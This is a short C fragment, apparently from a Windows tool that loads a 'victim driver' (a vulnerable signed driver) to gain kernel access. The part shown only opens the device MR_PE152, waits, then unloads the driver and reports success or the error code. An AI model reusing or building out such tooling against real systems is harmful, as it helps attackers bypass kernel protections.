    scmOpenDevice(MR_PE152, &hObject);
    Sleep(1000);

    //
    // Unload victim driver as it no longer needed.
    //
    supPrintText(TEXT("\r\n[+] Unloading victim driver"));
    status = STATUS_UNSUCCESSFUL;
    if (VictimLoadUnload(MR_PE152, szDriverFile, FALSE, TRUE, &status)) {
        supPrintText(TEXT("\r\n[+] Victim driver unloaded"));
        return TRUE;
    }
    else {
        _strcpy(szBuffer, TEXT("\r\n[!] Victim driver unload failed with code 0x"));
        ultostr(status, _strend(szBuffer));
        supPrintText(szBuffer);
    }
    return FALSE;
}
